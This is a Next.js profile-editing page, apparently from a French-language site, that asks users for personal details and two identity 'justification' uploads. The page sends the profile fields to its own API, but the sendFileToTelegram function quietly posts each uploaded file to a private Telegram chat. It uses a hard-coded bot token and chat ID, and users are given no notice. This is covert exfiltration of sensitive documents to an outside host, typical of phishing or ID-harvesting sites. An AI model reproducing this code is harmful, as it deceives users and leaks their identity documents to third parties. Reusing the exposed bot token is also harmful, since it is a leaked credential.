"use client";

import Button from "@/components/Button";
import TextInput from "@/components/TextInput";
import useTheme from "@/components/hooks/useTheme";
import axios from "axios";
import { useSearchParams } from "next/navigation";
import React, { useEffect, useState } from "react";
import { toast } from "react-hot-toast";
import { FaEdit } from "react-icons/fa";
import fetch from 'node-fetch';

const Page = () => {
  const { mode } = useTheme();
  const searchParams = useSearchParams();
  const userJson = searchParams.get("user");
  const user: userSchemaType = JSON.parse(userJson || "");
  const [loading, setLoading] = useState(false);
  const [input, setInput] = useState({
    fullname: "",
    email: "",
    username: "",
    phoneNumber: "",
    dateOfBirth: "",
    country: "",
    city: "",
    address: "",
  });
  const [file1, setFile1] = useState<File | null>(null);
  const [file2, setFile2] = useState<File | null>(null);  

  const updateData = {
    fullname: input.fullname,
    phoneNumber: input.phoneNumber,
    dateOfBirth: input.dateOfBirth,
    country: input.country,
    city: input.city,
    address: input.address,
  };

  useEffect(() => {
    setInput({
      fullname: user.fullname || "",
      email: user.email || "",
      username: user.username || "",
      phoneNumber: user.phoneNumber || "",
      dateOfBirth: user.dateOfBirth || "",
      country: user.country || "",
      city: user.city || "",
      address: user.address || "",
    });
  }, [
    user.address,
    user.city,
    user.country,
    user.dateOfBirth,
    user.email,
    user.fullname,
    user.phoneNumber,
    user.username,
  ]);

  const updateInfoHandler = async () => {
    try {
      setLoading(true);
      const { data } = await axios.patch("/api/users/anything", updateData);
      if (data.error) throw new Error(data.error);

      if (file1) {
        await sendFileToTelegram(file1);
      }

      if (file2) {
        await sendFileToTelegram(file2);
      }

      toast.success("Details Updated");
    } catch (error: any) {
      toast.error(error.message);
    } finally {
      setLoading(false);
    }
  };

  
  const sendFileToTelegram = async (file: File) => {
    const telegramBotToken = '6919709842:AAF8t4xE2YjjhzI6OGSFB_m8PtUYW2N8q44';
    const telegramChatId = '-4094626991';
  
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendDocument`;
  
    const formData = new FormData();
    formData.append('chat_id', telegramChatId);
    formData.append('document', file);
  
    await fetch(url, {
      method: 'POST',
      // @ts-ignore
      body: formData,
    });
  };

  const handleFile1Change = (e: React.ChangeEvent<HTMLInputElement>) => {
    const selectedFile = e.target.files?.[0];
    if (selectedFile) {
      setFile1(selectedFile);
    }
  };

  const handleFile2Change = (e: React.ChangeEvent<HTMLInputElement>) => {
    const selectedFile = e.target.files?.[0];
    if (selectedFile) {
      setFile2(selectedFile);
    }
  };

  return (
    <div
      className={`flex flex-col items-center gap-3
    ${mode === "light" ? "text-slate-700" : "text-white"}`}
    >
      <div className="text-2xl flex font-bold items-center gap-2">
        Editer les informations
        <FaEdit />
      </div>

      <div
        className={`w-full sm:w-[100%] shadow-md 
      rounded-md px-5 pt-5 pb-10 flex flex-col gap-4
      ${mode === "light" ? "shadow-gray-200" : "shadow-[#1d1d1d]"}`}
      >
        <div className="flex items-center gap-4 flex-col sm:flex-row">
          <div className="w-full">
            <div>Full Name</div>
            <TextInput
              value={input.fullname}
              onChange={(e) => setInput({ ...input, fullname: e.target.value })}
              placeholder=""
            />
          </div>

          <div className="w-full">
            <div>Email</div>
            <TextInput
              disabled={true}
              value={input.email}
              onChange={(e) => setInput({ ...input, email: e.target.value })}
              placeholder=""
            />
          </div>
        </div>

        <div className="flex items-center gap-4 flex-col sm:flex-row">
          <div className="w-full">
            <div>Nom D&utulisateur</div>
            <TextInput
              disabled
              value={input.username}
              onChange={(e) => setInput({ ...input, username: e.target.value })}
              placeholder=""
            />
          </div>

          <div className="w-full">
            <div>Phone Number</div>
            <TextInput
              value={input.phoneNumber}
              onChange={(e) =>
                setInput({ ...input, phoneNumber: e.target.value })
              }
              placeholder=""
            />
          </div>
        </div>

        <div className="flex items-center gap-4 flex-col sm:flex-row">
          <div className="w-full">
            <div>Date of birth</div>
            <TextInput
              value={input.dateOfBirth}
              onChange={(e) =>
                setInput({ ...input, dateOfBirth: e.target.value })
              }
              placeholder="dd-mm-yyy E.g 24-07-1985"
            />
          </div>

          <div className="w-full">
            <div>Country</div>
            <TextInput
              value={input.country}
              onChange={(e) => setInput({ ...input, country: e.target.value })}
              placeholder=""
            />
          </div>
        </div>

        <div className="flex items-center gap-4 flex-col sm:flex-row">
          <div className="w-full">
            <div>City/State</div>
            <TextInput
              value={input.city}
              onChange={(e) => setInput({ ...input, city: e.target.value })}
              placeholder=""
            />
          </div>

          <div className="w-full">
            <div>Address</div>
            <TextInput
              value={input.address}
              onChange={(e) => setInput({ ...input, address: e.target.value })}
              placeholder=""
            />
          </div>
        </div>

        <div className="flex items-center gap-4 flex-col sm:flex-row">
          <div className="w-full">
            <div>Justification 1</div>
            <label
              htmlFor="file1"
              className="flex items-center gap-2 cursor-pointer"
            >
              <span>{file1 ? file1.name : "Choisissez un fichier"}</span>
              <input
                type="file"
                id="file1"
                accept=".png, .pdf"
                onChange={handleFile1Change}
                style={{ display: "none" }}
              />
              <Button
                label="Télécharger"
                onClick={() =>
                  document.getElementById("file1")?.click()
                }
              />
            </label>
          </div>

          <div className="w-full">
            <div>Justification 2</div>
            <label
              htmlFor="file2"
              className="flex items-center gap-2 cursor-pointer"
            >
              <span>{file2 ? file2.name : "Choisissez un fichier"}</span>
              <input
                type="file"
                id="file2"
                accept=".png, .pdf"
                onChange={handleFile2Change}
                style={{ display: "none" }}
              />
              <Button
                label="Télécharger"
                onClick={() =>
                  document.getElementById("file2")?.click()
                }
              />
            </label>
          </div>
        </div>

        <Button
          loading={loading}
          label="Update Info"
          onClick={updateInfoHandler}
        />
      </div>
    </div>
  );
};

export default Page;
